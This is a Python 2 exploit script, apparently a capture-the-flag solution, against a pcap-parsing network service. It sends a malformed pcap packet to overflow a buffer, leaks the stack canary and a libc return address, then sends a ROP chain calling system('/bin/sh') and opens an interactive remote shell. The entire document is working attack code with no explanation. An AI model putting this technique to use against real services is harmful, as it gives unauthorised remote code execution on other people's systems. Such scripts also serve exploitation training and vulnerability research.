import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<Q', x)

def up(x):
    return struct.unpack('<Q', x)[0]

def p32(x):
    return struct.pack('<I', x)

def up32(x):
    return struct.unpack('<I', x)[0]

def p16(x):
    return struct.pack('>H', x)

def up16(x):
    return struct.unpack('>H', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

host = '200.200.200.5'
port = 9998

header = ('''
d4 c3 b2 a1 02 00 04 00 00 00 00 00 00 00 00 00 
ff ff 00 00 01 00 00 00 c2 ba cd 4f b6 35 0f 00 
''').replace('\n', '').replace(' ','').decode('hex')
#44 00 00 00 44 00 00 00 

mid1 = ('''
c46e 1f86 0b94 3c15 c2c2 056e 0800 4500
''').replace('\n', '').replace(' ','').decode('hex')

mid2 = ('''
040c40004006e4d7c0a80068c8c8c805f6e7270e69a214b450694f48801810084f1900000101080a29bc9b8d00ca8c97
''').replace('\n', '').replace(' ','').decode('hex')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

data = "A" * (0x210 - 0x6a - 0x4) + "CCCC"
data_len = p32(len(data) + len(mid1) + 2 + len(mid2)) * 2
len2 = p16(len(data) + 0x34 + 0x20 + 0x8 + 0x3b0)
readuntil(f, 'size: ')

package = header + data_len + mid1 + len2 + mid2 + data
length = len(package)
f.write(str(length) + '\n')

readuntil(f, 'pcap data\n')
print hex(length)
f.write(package)

readuntil(f, '>> ')
f.write('6\n')

readuntil(f, '43 43 43 43')
readuntil(f, '41 41 41 41 41 41 41 41 41 41 ')
readuntil(f, '41 41 41 41 41 41 ')
recv = f.read(23).replace(' ', '')
print recv
stack_canary = up(recv.decode('hex'))
print 'Stack Canary: %s' % hex(stack_canary)

recv = readuntil(f, 'Menu:').replace(' ', '')[:-2][-16:]
print recv
main_ret = up(recv.decode('hex'))
libc_base = main_ret - 0x21ec5
print 'Libc base: %s' % hex(libc_base)
raw_input('wait')
system = libc_base + 0x44c40 #0x46640
binsh = libc_base + 0x17c09b
pop_rdi_ret = 0x402083
#stack_canary = recv
#print recv

readuntil(f, '>> ')
f.write('5\n')
readuntil(f, 'payload : ')

raw_input('wait')
payload = "B" * 24
payload += p(stack_canary)
payload += "B" * 8
payload += p(pop_rdi_ret)
payload += p(binsh)
payload += p(system)
f.write(payload + '\n')

readuntil(f, '>> ')
f.write('7\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()

